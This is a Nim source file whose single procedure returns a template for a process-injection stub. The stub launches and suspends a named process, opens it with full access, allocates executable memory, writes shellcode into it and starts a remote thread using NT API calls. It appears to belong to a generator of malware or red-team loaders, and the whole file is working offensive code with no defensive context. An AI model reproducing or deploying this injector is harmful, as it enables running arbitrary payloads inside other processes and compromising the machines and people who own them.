import std/strformat

proc get_stub*(process: string): string =
    result = fmt"""
    
# main procedure
proc inject[I, T](shellcode: array[I,T]): void =
  echo "[*] Injector started"

  let tProcess = startProcess("{process}")
  tProcess.suspend() 
  defer: tProcess.close()

  echo "[*] Target Process: ", tProcess.processID

  var cid: CLIENT_ID
  var oa: OBJECT_ATTRIBUTES
  var pHandle: HANDLE
  var tHandle: HANDLE
  var ds: LPVOID
  var sc_size: SIZE_T = cast[SIZE_T](shellcode.len)

  cid.UniqueProcess = tProcess.processID

  var status = NtOpenProcess(
      &pHandle,
      PROCESS_ALL_ACCESS, 
      &oa, &cid         
  )

  echo "[*] pHandle: ", pHandle

  status = NtAllocateVirtualMemory(
      pHandle, &ds, 0, &sc_size, 
      MEM_COMMIT, 
      PAGE_EXECUTE_READWRITE);

  var bytesWritten: SIZE_T

  status = NtWriteVirtualMemory(
      pHandle, 
      ds, 
      unsafeAddr shellcode, 
      sc_size-1, 
      addr bytesWritten);

  echo "[*] WriteProcessMemory: ", status
  echo "    \\-- bytes written: ", bytesWritten
  echo ""

  status = NtCreateThreadEx(
      &tHandle, 
      THREAD_ALL_ACCESS, 
      NULL, 
      pHandle,
      ds, 
      NULL, FALSE, 0, 0, 0, NULL);

  status = NtClose(tHandle)
  status = NtClose(pHandle)

  echo "[*] tHandle: ", tHandle
"""